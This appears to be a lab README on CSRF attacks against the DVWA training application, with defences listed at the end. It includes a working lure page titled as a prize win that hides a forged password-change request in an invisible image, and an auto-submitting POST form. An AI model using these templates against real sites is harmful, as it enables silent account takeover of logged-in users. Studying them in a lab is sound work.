# 🎭 CSRF (Cross-Site Request Forgery)

## What is CSRF?

CSRF tricks a logged-in user into unknowingly submitting a malicious request on a website where they are authenticated. The attacker crafts a page that silently sends a forged request using the victim's active session.

---

## DVWA Module

The DVWA CSRF module is a **password change form**. It sends a GET request like:

```
http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change
```

If the victim is logged into DVWA and visits a malicious page containing this URL (as an image tag, iframe, or auto-submit form), their password gets changed without their knowledge.

---

## How It Works

### Step 1 — Craft a malicious page

Create an HTML file on your machine:

```html
<!DOCTYPE html>
<html>
<head>
  <title>You won a prize!</title>
</head>
<body>
  <h1>Congratulations! Click below to claim your prize.</h1>

  <!-- Hidden CSRF attack via image tag -->
  <img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" 
       width="0" height="0" />
</body>
</html>
```

### Step 2 — Send to victim

The victim (who is logged into DVWA) opens this page. Their browser automatically loads the image URL — which is actually the password change request — using their active session cookie.

### Step 3 — Result

DVWA processes the request as legitimate because:
- The session cookie is valid
- There is no CSRF token check (Low level)

The victim's password is now `hacked`.

---

## Auto-Submit Form Attack (POST requests)

For forms that use POST:

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
  <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="POST">
    <input type="hidden" name="password_new" value="hacked" />
    <input type="hidden" name="password_conf" value="hacked" />
    <input type="hidden" name="Change" value="Change" />
  </form>
</body>
</html>
```

---

## Payloads

See [`payloads.txt`](./payloads.txt)

---

## Security Levels

| Level | Protection |
|-------|-----------|
| Low | No CSRF token — fully vulnerable |
| Medium | Checks HTTP `Referer` header — bypass by setting referer |
| High | Anti-CSRF token in form — must steal token first (requires XSS) |
| Impossible | Token tied to user session + strict validation |

---

## How to Defend

- Use **CSRF tokens** (unique, random, per-session hidden fields in every form)
- Validate the `Origin` and `Referer` headers server-side
- Use `SameSite=Strict` or `SameSite=Lax` on session cookies
- Require re-authentication for sensitive actions (password change, payment)
